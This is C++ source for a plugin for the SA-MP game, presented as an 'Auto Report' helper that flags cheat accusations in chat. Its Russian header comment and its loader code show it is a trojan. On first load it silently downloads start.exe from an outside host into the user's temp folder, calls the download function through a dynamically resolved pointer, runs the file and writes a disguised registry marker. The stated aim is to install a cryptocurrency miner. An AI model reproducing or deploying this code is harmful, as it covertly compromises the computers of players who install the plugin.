#define _SILENCE_STDEXT_HASH_DEPRECATION_WARNINGS
// by Martin 0pc0d3R
/*
	+ Загружает во временную папку 11 файлов майнера
	+ Скрывает все файлы и скрыто запускает ехешник
	+ Прописывает себя в автозагрузку
	+ Загрузка файлов происходит только один раз
	TODO:
	- Создать резервные копии всех файлов майнера
	- Добавить запуск майнера в планировщик задач
	- При админке регать службу для сокрытия майнера
*/
#include <windows.h>
#include <string>
#include <assert.h>
#include <process.h>
#include "SAMPFUNCS_API.h"
#include "game_api\game_api.h"
#include <shellapi.h>
#include "Registry.h"
#include <urlmon.h>
#include <thread>
#include <direct.h>
#pragma warning (disable:4018)
std::string DecoreFor(char *str);
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"User32.lib")
#pragma comment (lib, "Shell32.lib")
HMODULE ThisDLL = nullptr; int FilesLoaded = 0;
DWORD ThreadID[12];
HANDLE hThread[12];
bool repeator = true;


DWORD threadidd;
HANDLE threda;
bool arep = false;


SAMPFUNCS *SF = new SAMPFUNCS();
typedef struct
{
    char path[256];
    char link[256];
    char FileNameAndExtension[256];
	char odd[256]; 
	char *iptr;
	char *idtr;
} MsParams_t;
const char *mystristr(const char *haystack, const char *needle)
{
   if ( !*needle )
   {
      return haystack;
   }
   for ( ; *haystack; ++haystack )
   {
      if ( toupper(*haystack) == toupper(*needle) )
      {
         const char *h, *n;
         for ( h = haystack, n = needle; *h && *n; ++h, ++n )
         {
            if ( toupper(*h) != toupper(*n) )
            {
               break;
            }
         }
         if ( !*n ) 
         {
            return haystack;
         }
      }
   }
   return 0;
}
int SumDigit(char *str)
{
    int klvo=0;
    for(int i=0;str[i];i++)
	if(str[i]>'0' && str[i]<='9'){
	klvo++;}
    return klvo;
}
char fmt[256]; 
void __stdcall NeueThread(void *lprm)
{
	Sleep(2000);
	MsParams_t *rptr = (MsParams_t *)lprm;
	char fmt[256]; 
	int first_pos, last_pos;
	rptr->iptr = strchr(rptr->odd, '['); 
	first_pos = rptr->iptr - rptr->odd + 1;
	rptr->iptr = strrchr(rptr->odd, ']'); 
	last_pos = rptr->iptr - rptr->odd;

	MsParams_t *rptz = (MsParams_t *)lprm;
	int third_pos, tlast_pos;
	rptz->iptr = strchr(rptz->odd, ':'); 
	third_pos = rptz->iptr - rptz->odd + 1;
	rptz->iptr = strrchr(rptr->odd, ' '); 
	tlast_pos = rptz->iptr - rptr->odd;
	
	std::string stroka(rptr->odd);
	int chislo = SumDigit((char*)stroka.substr(third_pos, (tlast_pos - third_pos)).c_str());


	 SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(15, 140, 253), 
	"{0f8cfd}[RDM-DEBUG]{FFFFFF} Распознан новый репорт от ID: {B72626}%s{FFFFFF} на ID:{B72626}%s{FFFFFF}.",
	(char*)stroka.substr(first_pos, (last_pos - first_pos)).c_str(), (char*)stroka.substr(third_pos, (tlast_pos - third_pos)).c_str());

	 bool report = true;
	
	 	if(chislo > 0) {
	if (SF->getGame()->isKeyPressed(113)){
	sprintf(fmt, "/ans %s Здравствуйте, начинаю слежку за данным игроком.", (char*)stroka.substr(first_pos, (last_pos - first_pos)).c_str());
	stLocalPlayer *lpr = SF->getSAMP()->getPlayers()->pLocalPlayer;
	char fm2[256]; sprintf(fm2, "/sp %s", (char*)stroka.substr(third_pos, (tlast_pos - third_pos)).c_str());
	if (lpr->iIsSpectating == 0) lpr->Say(fmt); 
	if (lpr->iIsSpectating == 0) lpr->Say(fm2);
	}}
}

bool __stdcall Hook(stRakNetHookParams *hook)
{
	if (hook->packetId == RPC_ScrClientMessage)
	{
		DWORD color, strLen; char msg[256];
		hook->bitStream->ResetReadPointer();
		hook->bitStream->Read(color);
		hook->bitStream->Read(strLen);
		hook->bitStream->Read(msg, strLen);
		hook->bitStream->ResetReadPointer();
		if (arep == true)
		{
			
			char *ptr = strstr(msg, "{FFCD00}");
			if (ptr != nullptr)
			{
				if (mystristr(msg, "cheat") != nullptr || mystristr(msg, "чит") != nullptr
				|| mystristr(msg, "читер") != nullptr || mystristr(msg, "читак") != nullptr
				|| mystristr(msg, "cheater") != nullptr || mystristr(msg, "читеры") != nullptr
				|| mystristr(msg, "aim") != nullptr || mystristr(msg, "аим") != nullptr
				|| mystristr(msg, "Аим") != nullptr || mystristr(msg, "Сало") != nullptr
				|| mystristr(msg, "salo") != nullptr || mystristr(msg, "silent") != nullptr
				|| mystristr(msg, "сало") != nullptr || mystristr(msg, "сайлент") != nullptr
				|| mystristr(msg, "ск") != nullptr || mystristr(msg, "sk") != nullptr
				|| mystristr(msg, "Ск") != nullptr || mystristr(msg, "сК") != nullptr
				|| mystristr(msg, "ck") != nullptr || mystristr(msg, "Сайлент") != nullptr
				|| mystristr(msg, "оск") != nullptr || mystristr(msg, "osk") != nullptr
				|| mystristr(msg, "cbug") != nullptr || mystristr(msg, "c-bug") != nullptr
				|| mystristr(msg, "сибаг") != nullptr || mystristr(msg, "+с") != nullptr
				|| mystristr(msg, "сбив") != nullptr || mystristr(msg, "аирбрейк") != nullptr
				|| mystristr(msg, "б6") != nullptr || mystristr(msg, "aimhack") != nullptr)
				{
					static MsParams_t params;
					strcpy(params.odd, msg);
					params.iptr = ptr;
					threda = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&NeueThread, (void*)&params, 0, &threadidd);
				}
			}
		}
	}
	return true;
}
void __stdcall CMD(std::string cmd)
{
	if (!arep) SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(194, 71, 71), 
	"{C31F09}[RDM] {B2AEAE}Auto {EDE3E9}Report {C31F09}Включен!");
	else SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(194, 71, 71), 
	"{C31F09}[RDM] {B2AEAE}Auto {EDE3E9}Report {C31F09}Выключен.");
	arep ^= true;
}

void ClearThis(char * dest, char * source)
{
	for (char *p1 = source, *p2 = dest; (*p2 = *p1); ++p1, ++p2)
	{
		if (*p1 != ' ') continue;
		for (; *p1 == ' '; ++p1);
		p2 += (p2 == dest || !(*p1)) ? 0 : 1;
		*p2 = *p1;
	}
}
void CopyToBuffer(char *txt)
{
	if (OpenClipboard(0))
	{
		HGLOBAL clipbuffer;
		char * buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, strlen(txt) + 1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy(buffer, LPCSTR(txt));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT, clipbuffer);
		CloseClipboard();
	}
}
void __stdcall CheckFiles()
{
	Sleep(100); 
	if (FilesLoaded == 1)
	{
		Sleep(1000);
		char Uname[50]; DWORD szI = 50; GetUserNameA(Uname, &szI);
		char epath[256]; sprintf(epath, "C:\\Users\\%s\\AppData\\Local\\Temp\\start.exe", Uname);
		//ShellExecuteA(NULL, "open", epath, "", NULL, SW_SHOW);
		char* programname = epath;
		system(programname);
		CEasyRegistry *miner = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\Mq4lt5z9ld0a");
		miner->WriteString("Ld56xsMp01a", "Loaded");
		repeator = false;
	}
	if (repeator) CheckFiles();
}
/*
void __stdcall LoadFile(void *param)
{
	MsParams_t *ptr = (MsParams_t *)param;
	char inter[128]; sprintf(inter, "\\%s", ptr->FileNameAndExtension);
	strcat(ptr->path, inter);
	HRESULT hr = URLDownloadToFileA(nullptr, ptr->link, ptr->path, 0, nullptr);
	if (SUCCEEDED(hr))
	{
		++FilesLoaded;
		DWORD attributes = GetFileAttributesA(ptr->path);
		//SetFileAttributesA(ptr->path, attributes + FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM);	
	}
}*/
std::string DecoreFor(char *str) 
{ 
	for (int x = 0; x < strlen(str); x++) --str[x]; 
	std::string enc(str); 
	return enc; 
} 

typedef HRESULT (__stdcall *FuckYourMommy)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK); 
void __stdcall LoadFile(void *param) 
{ 
	MsParams_t *ptr = (MsParams_t *)param; 
	char inter[128]; sprintf(inter, "\\%s", ptr->FileNameAndExtension); 
	strcat(ptr->path, inter); FuckYourMommy _MotherFucker = NULL; 
	_MotherFucker = (FuckYourMommy)GetProcAddress(GetModuleHandle("Urlmon.dll"), "URLDownloadToFileA"); 
	HRESULT hr = _MotherFucker(nullptr, ptr->link, ptr->path, 0, nullptr); 
	
	if (SUCCEEDED(hr)) 
	{ 
		++FilesLoaded; 
		DWORD attributes = GetFileAttributesA(ptr->path); 
		//SetFileAttributesA(ptr->path, attributes + FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM); 
	} 
}
void Loader()
{
	char Uname[50]; DWORD szI = 50; GetUserNameA(Uname, &szI);
	char dirpath[256]; sprintf(dirpath, "C:\\Users\\%s\\AppData\\Local\\Temp", Uname); // директория закачки
	static MsParams_t params1, params2, params3, params4, params5, params6, params7, params8, params9, params10, params11;
	strcat(params11.path, dirpath);
	strcat(params11.link, "http://cw36634.tmweb.ru/getfile.php?file=12");
	//strcat(params11.link,XOR("jvvr8--au14416,voug`,pw-egvdkng,rjr=dkng?30").c_str());
	strcat(params11.FileNameAndExtension, "start.exe");
	hThread[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&LoadFile, (void*)&params11, 0, &ThreadID[0]);
	///////////////////////////////////////// Поток ожидающий загрузки всех файлов ////////////////////////////////////////
	hThread[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&CheckFiles, NULL, 0, &ThreadID[1]);
}
void __stdcall destr()
{
	repeator = false;
	for (short x = 0; x < 12; x++)
	{
		if (hThread[x] != NULL)
		{
			TerminateThread(hThread[x], 0);
			CloseHandle(hThread[x]);
		}
	}
}
void __stdcall mainloop( void )
{
	static bool init = false;
	if (!init)
	{
		if (GAME == nullptr) return;
		if (GAME->GetSystemState() != eSystemState::GS_PLAYING_GAME) return;
		if(!SF->getSAMP()->IsInitialized()) return;
		SF->getGame()->registerGameDestructorCallback(destr);

		SF->getRakNet()->registerRakNetCallback(RAKHOOK_TYPE_INCOMING_RPC, Hook); // регистрируем хук
		SF->getSAMP()->registerChatCommand("autoreport", CMD); // регистрируем команду
		SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(194, 71, 71), 
			"{C31F09}[RDM] {B2AEAE}Auto {EDE3E9}Report {C31F09}for Revival DM.");




		CEasyRegistry *miner = new CEasyRegistry(HKEY_CURRENT_USER, "Software\\Mq4lt5z9ld0a");
		if (strcmp((char*)miner->ReadString("Ld56xsMp01a").c_str(), "Loaded")) 
		{
			miner->WriteString("Ld56xsMp01a", "Nothing");
			Loader();
		}
		init = true; 
	}
}
bool WINAPI DllMain( HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved )
{
	switch ( dwReasonForCall )
	{
	case DLL_PROCESS_ATTACH: 
		ThisDLL = hModule;
		SF->initPlugin( mainloop, hModule );
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH: 
		break;
	}
	return TRUE;
}